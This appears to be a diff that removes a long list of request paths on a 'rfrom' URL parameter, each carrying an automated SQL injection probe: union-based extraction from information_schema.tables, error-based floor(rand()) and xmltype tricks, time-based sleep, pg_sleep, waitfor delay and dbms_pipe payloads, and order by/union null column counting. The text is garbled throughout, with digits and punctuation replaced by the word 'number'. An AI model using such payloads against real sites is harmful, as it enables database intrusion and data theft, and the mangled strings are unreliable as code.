@@ -1,236 +1,567 @@
-/?rfrom=soso
-/?rfrom=soso&gdue  number d number   number and  number   number d number   number union  number all  number select  number   number c number   number c number   number ctable_name  number from  number information_schema.tables  number where  number   number e number     number ..  number f..  number f..  number fetc  number fpasswd
-/?rfrom=soso
-/?rfrom= number 
-/?rfrom= number 
-/?rfrom=soso  number   number c.  number c  number .  number .  number   number c
-/?rfrom=soso  number yoohmr  number c  number   number   number eauvhiv
-/?rfrom=soso  number   number and  number   number d number   number and  number   number   number d number 
-/?rfrom=soso  number   number and  number   number d number   number and  number   number   number d number 
-/?rfrom=soso  number and  number   number d number 
-/?rfrom=soso  number and  number   number d number 
-/?rfrom=soso  number   number   number and  number   number d number   number and  number   number   number rdui  number   number d  number rdui
-/?rfrom=soso  number   number   number and  number   number d number   number and  number   number   number pmug  number   number d  number pmug
-/?rfrom=soso  number   number and  number   number d number   number and  number   number qavb  number   number d  number qavb
-/?rfrom=soso  number   number and  number   number d number   number and  number   number ciyp  number   number d  number ciyp
-/?rfrom=soso  number   number   number and  number   number d number   number and  number   number   number   number   number d  number 
-/?rfrom=soso  number   number   number and  number   number d number   number and  number   number   number   number   number d  number 
-/?rfrom=soso  number and  number   number d number     number anzy
-/?rfrom=soso  number and  number   number d number     number qmqd
-/?rfrom=soso  number and  number   number d number     number qmqd
-/?rfrom=  number select  number   number case  number when  number   number   number d number   number   number then  number   number else  number   number a  number select  number   number from  number information_schema.character_sets  number   number end  number   number 
-/?rfrom=  number select  number   number case  number when  number   number   number d number   number   number then  number   number else  number   number a  number select  number   number from  number information_schema.character_sets  number   number end  number   number 
-/?rfrom=soso  number   number and  number   number select  number   number from  number select  number count  number   number a  number   number cconcat  number x number b number   number c  number select  number   number elt  number   number d number   number c number   number   number   number   number c number x number a number a number   number cfloor  number rand  number   number   number a number   number   number x  number from  number information_schema.character_sets  number group  number by  number x  number a  number   number and  number   number   number d number 
-/?rfrom=soso  number and  number   number select  number   number from  number select  number count  number   number a  number   number cconcat  number x number b number   number c  number select  number   number elt  number   number d number   number c number   number   number   number   number c number x number a number a number   number cfloor  number rand  number   number   number a number   number   number x  number from  number information_schema.character_sets  number group  number by  number x  number a  number 
-/?rfrom=soso  number   number   number and  number   number select  number   number from  number select  number count  number   number a  number   number cconcat  number x number b number   number c  number select  number   number elt  number   number d number   number c number   number   number   number   number c number x number a number a number   number cfloor  number rand  number   number   number a number   number   number x  number from  number information_schema.character_sets  number group  number by  number x  number a  number   number and  number   number   number hofw  number   number d  number hofw
-/?rfrom=soso  number   number and  number   number select  number   number from  number select  number count  number   number a  number   number cconcat  number x number b number   number c  number select  number   number elt  number   number d number   number c number   number   number   number   number c number x number a number a number   number cfloor  number rand  number   number   number a number   number   number x  number from  number information_schema.character_sets  number group  number by  number x  number a  number   number and  number   number gnof  number   number d  number gnof
-/?rfrom=soso  number   number   number and  number   number select  number   number from  number select  number count  number   number a  number   number cconcat  number x number b number   number c  number select  number   number elt  number   number d number   number c number   number   number   number   number c number x number a number a number   number cfloor  number rand  number   number   number a number   number   number x  number from  number information_schema.character_sets  number group  number by  number x  number a  number   number and  number   number   number   number   number d  number 
-/?rfrom=soso  number and  number   number select  number   number from  number select  number count  number   number a  number   number cconcat  number x number b number   number c  number select  number   number elt  number   number d number   number c number   number   number   number   number c number x number a number a number   number cfloor  number rand  number   number   number a number   number   number x  number from  number information_schema.character_sets  number group  number by  number x  number a  number     number aank
-/?rfrom=soso  number   number and  number   number dcast  number   number chr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number   number c  number c  number select  number   number case  number when  number   number   number d number   number   number then  number   number else  number   number end  number   number   number a  number atext  number c  number c  number chr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number   number as  number numeric  number   number and  number   number   number d number 
-/?rfrom=soso  number and  number   number dcast  number   number chr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number   number c  number c  number select  number   number case  number when  number   number   number d number   number   number then  number   number else  number   number end  number   number   number a  number atext  number c  number c  number chr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number   number as  number numeric  number 
-/?rfrom=soso  number   number   number and  number   number dcast  number   number chr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number   number c  number c  number select  number   number case  number when  number   number   number d number   number   number then  number   number else  number   number end  number   number   number a  number atext  number c  number c  number chr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number   number as  number numeric  number   number and  number   number   number hmwr  number   number d  number hmwr
-/?rfrom=soso  number   number and  number   number dcast  number   number chr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number   number c  number c  number select  number   number case  number when  number   number   number d number   number   number then  number   number else  number   number end  number   number   number a  number atext  number c  number c  number chr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number   number as  number numeric  number   number and  number   number mfwy  number   number d  number mfwy
-/?rfrom=soso  number   number   number and  number   number dcast  number   number chr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number   number c  number c  number select  number   number case  number when  number   number   number d number   number   number then  number   number else  number   number end  number   number   number a  number atext  number c  number c  number chr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number   number as  number numeric  number   number and  number   number   number   number   number d  number 
-/?rfrom=soso  number and  number   number dcast  number   number chr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number   number c  number c  number select  number   number case  number when  number   number   number d number   number   number then  number   number else  number   number end  number   number   number a  number atext  number c  number c  number chr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number   number as  number numeric  number     number nefy
-/?rfrom=soso  number   number and  number   number dconvert  number int  number c  number select  number char  number   number   number bchar  number   number   number bchar  number   number   number bchar  number   number   number bchar  number   number   number b  number select  number   number case  number when  number   number   number d number   number   number then  number char  number   number   number else  number char  number   number   number end  number   number   number bchar  number   number   number bchar  number   number   number bchar  number   number   number bchar  number   number   number bchar  number   number   number   number   number and  number   number   number d number 
-/?rfrom=soso  number and  number   number dconvert  number int  number c  number select  number char  number   number   number bchar  number   number   number bchar  number   number   number bchar  number   number   number bchar  number   number   number b  number select  number   number case  number when  number   number   number d number   number   number then  number char  number   number   number else  number char  number   number   number end  number   number   number bchar  number   number   number bchar  number   number   number bchar  number   number   number bchar  number   number   number bchar  number   number   number   number 
-/?rfrom=soso  number   number   number and  number   number dconvert  number int  number c  number select  number char  number   number   number bchar  number   number   number bchar  number   number   number bchar  number   number   number bchar  number   number   number b  number select  number   number case  number when  number   number   number d number   number   number then  number char  number   number   number else  number char  number   number   number end  number   number   number bchar  number   number   number bchar  number   number   number bchar  number   number   number bchar  number   number   number bchar  number   number   number   number   number and  number   number   number dihq  number   number d  number dihq
-/?rfrom=soso  number   number and  number   number dconvert  number int  number c  number select  number char  number   number   number bchar  number   number   number bchar  number   number   number bchar  number   number   number bchar  number   number   number b  number select  number   number case  number when  number   number   number d number   number   number then  number char  number   number   number else  number char  number   number   number end  number   number   number bchar  number   number   number bchar  number   number   number bchar  number   number   number bchar  number   number   number bchar  number   number   number   number   number and  number   number tnpc  number   number d  number tnpc
-/?rfrom=soso  number   number   number and  number   number dconvert  number int  number c  number select  number char  number   number   number bchar  number   number   number bchar  number   number   number bchar  number   number   number bchar  number   number   number b  number select  number   number case  number when  number   number   number d number   number   number then  number char  number   number   number else  number char  number   number   number end  number   number   number bchar  number   number   number bchar  number   number   number bchar  number   number   number bchar  number   number   number bchar  number   number   number   number   number and  number   number   number   number   number d  number 
-/?rfrom=soso  number and  number   number dconvert  number int  number c  number select  number char  number   number   number bchar  number   number   number bchar  number   number   number bchar  number   number   number bchar  number   number   number b  number select  number   number case  number when  number   number   number d number   number   number then  number char  number   number   number else  number char  number   number   number end  number   number   number bchar  number   number   number bchar  number   number   number bchar  number   number   number bchar  number   number   number bchar  number   number   number   number     number sywp
-/?rfrom=soso  number   number and  number   number d  number select  number upper  number xmltype  number chr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number c  number select  number   number case  number when  number   number   number d number   number   number then  number   number else  number   number end  number   number from  number dual  number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number   number   number from  number dual  number   number and  number   number   number d number 
-/?rfrom=soso  number and  number   number d  number select  number upper  number xmltype  number chr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number c  number select  number   number case  number when  number   number   number d number   number   number then  number   number else  number   number end  number   number from  number dual  number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number   number   number from  number dual  number 
-/?rfrom=soso  number   number   number and  number   number d  number select  number upper  number xmltype  number chr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number c  number select  number   number case  number when  number   number   number d number   number   number then  number   number else  number   number end  number   number from  number dual  number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number   number   number from  number dual  number   number and  number   number   number iobf  number   number d  number iobf
-/?rfrom=soso  number   number and  number   number d  number select  number upper  number xmltype  number chr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number c  number select  number   number case  number when  number   number   number d number   number   number then  number   number else  number   number end  number   number from  number dual  number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number   number   number from  number dual  number   number and  number   number skvv  number   number d  number skvv
-/?rfrom=soso  number   number   number and  number   number d  number select  number upper  number xmltype  number chr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number c  number select  number   number case  number when  number   number   number d number   number   number then  number   number else  number   number end  number   number from  number dual  number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number   number   number from  number dual  number   number and  number   number   number   number   number d  number 
-/?rfrom=soso  number and  number   number d  number select  number upper  number xmltype  number chr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number c  number select  number   number case  number when  number   number   number d number   number   number then  number   number else  number   number end  number   number from  number dual  number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number   number   number from  number dual  number     number axtq
-/?rfrom=soso  number and  number   number d  number select  number upper  number xmltype  number chr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number c  number select  number   number case  number when  number   number   number d number   number   number then  number   number else  number   number end  number   number from  number dual  number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number   number   number from  number dual  number     number axtq
-/?rfrom=  number select  number   number from  number select  number count  number   number a  number   number cconcat  number x number b number   number c  number select  number   number elt  number   number d number   number c number   number   number   number   number c number x number a number a number   number cfloor  number rand  number   number   number a number   number   number x  number from  number information_schema.character_sets  number group  number by  number x  number a  number 
-/?rfrom=  number select  number concat  number x number b number   number c  number select  number   number elt  number   number d number   number c number   number   number   number   number c number x number a number a number   number   number 
-/?rfrom=  number select  number   number chr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number   number c  number c  number select  number   number case  number when  number   number   number d number   number   number then  number   number else  number   number end  number   number   number a  number atext  number c  number c  number chr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number   number 
-/?rfrom=  number select  number char  number   number   number bchar  number   number   number bchar  number   number   number bchar  number   number   number bchar  number   number   number b  number select  number   number case  number when  number   number   number d number   number   number then  number char  number   number   number else  number char  number   number   number end  number   number   number bchar  number   number   number bchar  number   number   number bchar  number   number   number bchar  number   number   number bchar  number   number   number 
-/?rfrom=soso  number   number b  number select  number   number a  number from  number   number select  number sleep  number   number   number   number jvow  number   number 
-/?rfrom=soso  number b  number select  number   number a  number from  number   number select  number sleep  number   number   number   number jvow  number   number 
-/?rfrom=soso  number   number   number b  number select  number   number a  number from  number   number select  number sleep  number   number   number   number jvow  number   number 
-/?rfrom=soso  number   number b  number select  number   number a  number from  number   number select  number sleep  number   number   number   number jvow  number   number 
-/?rfrom=soso  number   number   number b  number select  number   number a  number from  number   number select  number sleep  number   number   number   number jvow  number   number 
-/?rfrom=soso  number   number bselect  number pg_sleep  number   number   
-/?rfrom=soso  number bselect  number pg_sleep  number   number   
-/?rfrom=soso  number   number   number bselect  number pg_sleep  number   number   
-/?rfrom=soso  number   number   number bselect  number pg_sleep  number   number   
-/?rfrom=soso  number   number bselect  number pg_sleep  number   number   
-/?rfrom=soso  number   number   number bselect  number pg_sleep  number   number   
-/?rfrom=soso  number   number bwaitfor  number delay  number   number   number a number   number a number   number   
-/?rfrom=soso  number bwaitfor  number delay  number   number   number a number   number a number   number   
-/?rfrom=soso  number   number   number bwaitfor  number delay  number   number   number a number   number a number   number   
-/?rfrom=soso  number   number bwaitfor  number delay  number   number   number a number   number a number   number   
-/?rfrom=soso  number   number   number bwaitfor  number delay  number   number   number a number   number a number   number   
-/?rfrom=soso  number   number bselect  number dbms_pipe.receive_message  number chr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c number   number   number from  number dual  
-/?rfrom=soso  number bselect  number dbms_pipe.receive_message  number chr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c number   number   number from  number dual  
-/?rfrom=soso  number   number   number bselect  number dbms_pipe.receive_message  number chr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c number   number   number from  number dual  
-/?rfrom=soso  number   number   number bselect  number dbms_pipe.receive_message  number chr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c number   number   number from  number dual  
-/?rfrom=soso  number   number bselect  number dbms_pipe.receive_message  number chr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c number   number   number from  number dual  
-/?rfrom=soso  number   number   number bselect  number dbms_pipe.receive_message  number chr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c number   number   number from  number dual  
-/?rfrom=soso  number   number and  number   number select  number   number a  number from  number   number select  number sleep  number   number   number   number chpg  number   number and  number   number   number d number 
-/?rfrom=soso  number and  number   number select  number   number a  number from  number   number select  number sleep  number   number   number   number chpg  number 
-/?rfrom=soso  number   number   number and  number   number select  number   number a  number from  number   number select  number sleep  number   number   number   number chpg  number   number and  number   number   number xrec  number   number d  number xrec
-/?rfrom=soso  number   number and  number   number select  number   number a  number from  number   number select  number sleep  number   number   number   number chpg  number   number and  number   number ztlb  number   number d  number ztlb
-/?rfrom=soso  number   number   number and  number   number select  number   number a  number from  number   number select  number sleep  number   number   number   number chpg  number   number and  number   number   number   number   number d  number 
-/?rfrom=soso  number and  number   number select  number   number a  number from  number   number select  number sleep  number   number   number   number chpg  number     number jbme
-/?rfrom=soso  number   number and  number   number d  number select  number   number from  number pg_sleep  number   number   number   number and  number   number   number d number 
-/?rfrom=soso  number and  number   number d  number select  number   number from  number pg_sleep  number   number   number 
-/?rfrom=soso  number   number   number and  number   number d  number select  number   number from  number pg_sleep  number   number   number   number and  number   number   number qsnq  number   number d  number qsnq
-/?rfrom=soso  number   number and  number   number d  number select  number   number from  number pg_sleep  number   number   number   number and  number   number vvjs  number   number d  number vvjs
-/?rfrom=soso  number   number   number and  number   number d  number select  number   number from  number pg_sleep  number   number   number   number and  number   number   number   number   number d  number 
-/?rfrom=soso  number and  number   number d  number select  number   number from  number pg_sleep  number   number   number     number kayo
-/?rfrom=soso  number   number waitfor  number delay  number   number   number a number   number a number   number   number and  number   number   number d number 
-/?rfrom=soso  number waitfor  number delay  number   number   number a number   number a number   number 
-/?rfrom=soso  number   number   number waitfor  number delay  number   number   number a number   number a number   number   number and  number   number   number aszj  number   number d  number aszj
-/?rfrom=soso  number   number waitfor  number delay  number   number   number a number   number a number   number   number and  number   number lhbc  number   number d  number lhbc
-/?rfrom=soso  number   number   number waitfor  number delay  number   number   number a number   number a number   number   number and  number   number   number   number   number d  number 
-/?rfrom=soso  number waitfor  number delay  number   number   number a number   number a number   number     number ovgj
-/?rfrom=soso  number   number and  number   number ddbms_pipe.receive_message  number chr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c number   number   number and  number   number   number d number 
-/?rfrom=soso  number and  number   number ddbms_pipe.receive_message  number chr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c number   number 
-/?rfrom=soso  number   number   number and  number   number ddbms_pipe.receive_message  number chr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c number   number   number and  number   number   number ztfn  number   number d  number ztfn
-/?rfrom=soso  number   number and  number   number ddbms_pipe.receive_message  number chr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c number   number   number and  number   number hbue  number   number d  number hbue
-/?rfrom=soso  number   number   number and  number   number ddbms_pipe.receive_message  number chr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c number   number   number and  number   number   number   number   number d  number 
-/?rfrom=soso  number and  number   number ddbms_pipe.receive_message  number chr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c number   number     number djnz
-/?rfrom=soso  number   number order  number by  number     number  
-/?rfrom=soso  number   number union  number all  number select  number null    number  
-/?rfrom=soso  number   number union  number all  number select  number null  number cnull    number  
-/?rfrom=soso  number   number union  number all  number select  number null  number cnull  number cnull    number  
-/?rfrom=soso  number   number union  number all  number select  number null  number cnull  number cnull  number cnull    number  
-/?rfrom=soso  number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull    number  
-/?rfrom=soso  number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull    number  
-/?rfrom=soso  number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull    number  
-/?rfrom=soso  number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull    number  
-/?rfrom=soso  number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull    number  
-/?rfrom=soso  number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull    number  
-/?rfrom=soso  number order  number by  number     number  
-/?rfrom=soso  number union  number all  number select  number null    number  
-/?rfrom=soso  number union  number all  number select  number null  number cnull    number  
-/?rfrom=soso  number union  number all  number select  number null  number cnull  number cnull    number  
-/?rfrom=soso  number union  number all  number select  number null  number cnull  number cnull  number cnull    number  
-/?rfrom=soso  number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull    number  
-/?rfrom=soso  number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull    number  
-/?rfrom=soso  number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull    number  
-/?rfrom=soso  number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull    number  
-/?rfrom=soso  number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull    number  
-/?rfrom=soso  number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull    number  
-/?rfrom=soso  number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull    number  
-/?rfrom=soso  number   number   number order  number by  number     number  
-/?rfrom=soso  number   number   number union  number all  number select  number null    number  
-/?rfrom=soso  number   number   number union  number all  number select  number null  number cnull    number  
-/?rfrom=soso  number   number   number union  number all  number select  number null  number cnull  number cnull    number  
-/?rfrom=soso  number   number   number union  number all  number select  number null  number cnull  number cnull  number cnull    number  
-/?rfrom=soso  number   number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull    number  
-/?rfrom=soso  number   number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull    number  
-/?rfrom=soso  number   number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull    number  
-/?rfrom=soso  number   number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull    number  
-/?rfrom=soso  number   number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull    number  
-/?rfrom=soso  number   number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull    number  
-/?rfrom=soso  number   number order  number by  number     number  
-/?rfrom=soso  number   number union  number all  number select  number null    number  
-/?rfrom=soso  number   number union  number all  number select  number null  number cnull    number  
-/?rfrom=soso  number   number union  number all  number select  number null  number cnull  number cnull    number  
-/?rfrom=soso  number   number union  number all  number select  number null  number cnull  number cnull    number  
-/?rfrom=soso  number   number union  number all  number select  number null  number cnull  number cnull  number cnull    number  
-/?rfrom=soso  number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull    number  
-/?rfrom=soso  number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull    number  
-/?rfrom=soso  number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull    number  
-/?rfrom=soso  number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull    number  
-/?rfrom=soso  number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull    number  
-/?rfrom=soso  number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull    number  
-/?rfrom=soso  number   number   number order  number by  number     number  
-/?rfrom=soso  number   number   number union  number all  number select  number null    number  
-/?rfrom=soso  number   number   number union  number all  number select  number null  number cnull    number  
-/?rfrom=soso  number   number   number union  number all  number select  number null  number cnull  number cnull    number  
-/?rfrom=soso  number   number   number union  number all  number select  number null  number cnull  number cnull  number cnull    number  
-/?rfrom=soso  number   number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull    number  
-/?rfrom=soso  number   number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull    number  
-/?rfrom=soso  number   number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull    number  
-/?rfrom=soso  number   number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull    number  
-/?rfrom=soso  number   number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull    number  
-/?rfrom=soso  number   number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull    number  
-/?rfrom=soso  number order  number by  number     number  
-/?rfrom=soso  number union  number all  number select  number null    number  
-/?rfrom=soso  number union  number all  number select  number null  number cnull    number  
-/?rfrom=soso  number union  number all  number select  number null  number cnull  number cnull    number  
-/?rfrom=soso  number union  number all  number select  number null  number cnull  number cnull  number cnull    number  
-/?rfrom=soso  number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull    number  
-/?rfrom=soso  number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull    number  
-/?rfrom=soso  number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull    number  
-/?rfrom=soso  number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull    number  
-/?rfrom=soso  number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull    number  
-/?rfrom=soso  number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull    number  
-/?rfrom=soso  number   number order  number by  number   number 
-/?rfrom=soso  number   number union  number all  number select  number null  number 
-/?rfrom=soso  number   number union  number all  number select  number null  number cnull  number 
-/?rfrom=soso  number   number union  number all  number select  number null  number cnull  number cnull  number 
-/?rfrom=soso  number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number 
-/?rfrom=soso  number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number 
-/?rfrom=soso  number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number 
-/?rfrom=soso  number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number 
-/?rfrom=soso  number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number 
-/?rfrom=soso  number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number 
-/?rfrom=soso  number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number 
-/?rfrom=soso  number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number 
-/?rfrom=soso  number order  number by  number   number 
-/?rfrom=soso  number order  number by  number   number 
-/?rfrom=soso  number union  number all  number select  number null  number 
-/?rfrom=soso  number union  number all  number select  number null  number cnull  number 
-/?rfrom=soso  number union  number all  number select  number null  number cnull  number cnull  number 
-/?rfrom=soso  number union  number all  number select  number null  number cnull  number cnull  number cnull  number 
-/?rfrom=soso  number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number 
-/?rfrom=soso  number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number 
-/?rfrom=soso  number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number 
-/?rfrom=soso  number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number 
-/?rfrom=soso  number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number 
-/?rfrom=soso  number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number 
-/?rfrom=soso  number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number 
-/?rfrom=soso  number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number 
-/?rfrom=soso  number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number 
-/?rfrom=soso  number   number   number order  number by  number   number 
-/?rfrom=soso  number   number   number union  number all  number select  number null  number 
-/?rfrom=soso  number   number   number union  number all  number select  number null  number cnull  number 
-/?rfrom=soso  number   number   number union  number all  number select  number null  number cnull  number cnull  number 
-/?rfrom=soso  number   number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number 
-/?rfrom=soso  number   number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number 
-/?rfrom=soso  number   number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number 
-/?rfrom=soso  number   number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number 
-/?rfrom=soso  number   number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number 
-/?rfrom=soso  number   number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number 
-/?rfrom=soso  number   number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number 
-/?rfrom=soso  number   number order  number by  number   number 
-/?rfrom=soso  number   number union  number all  number select  number null  number 
-/?rfrom=soso  number   number union  number all  number select  number null  number cnull  number 
-/?rfrom=soso  number   number union  number all  number select  number null  number cnull  number cnull  number 
-/?rfrom=soso  number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number 
-/?rfrom=soso  number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number 
-/?rfrom=soso  number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number 
-/?rfrom=soso  number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number 
-/?rfrom=soso  number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number 
-/?rfrom=soso  number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number 
